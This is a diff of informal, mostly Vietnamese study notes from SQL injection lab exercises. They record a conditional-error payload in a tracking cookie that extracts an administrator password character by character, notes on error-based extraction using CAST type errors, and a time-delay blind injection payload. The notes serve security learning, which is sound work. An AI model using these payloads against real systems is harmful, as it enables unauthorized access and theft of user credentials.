@@ -201,5 +201,16 @@ check length đầu tiên thử với 1 => http 500 bởi vỉ len bao giờ cũ
 step 3: Cookie: TrackingId=Zu7dl5R3XHnm79lN' AND (SELECT CASE WHEN  SUBSTR(password,20,1) = 'a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a'-- ; session=wyBSPanpq7FhKRQ6VqoQI0jfdnODK7n
 dùng đó để brute force cũng được, chạy tay cũng được => pass...dcza362vk1g10mydn8ii   
 
+-Extracting sensitive data via verbose SQL error messages
+. For example, consider the following error message, which occurs after injecting a single quote into an id parameter:
+  Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+CAST((SELECT example_column FROM example_table) AS int) sử dụng để chuyển đổi kiểu dữ liêu (từ kiểu này sang kiểu khác => lỗi => biết kiểu dữ liệu cần khai thác thuộc loại gì => khai thác)
+
+hmmm lab khoai vcl, không biết viết query thì toang thật , cơ bản nó sẽ là check phản hổi của server, dùng kiểu dữ liệu khác để yêu cầu (vd password dạng string thì dùng int) => báo lỗi sai kiểu dữ liệu, đồng thời nó hiện cái pass luôn
+một cái nữa là độ dài, có thể xóa đi mã tracking id vì vế sau đúng r thì có cần check vế trước đâu => đủ khoảng cách cho lệnh khai thác của mình
+
+-Exploiting blind SQL injection by triggering time delays 
+
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 
 
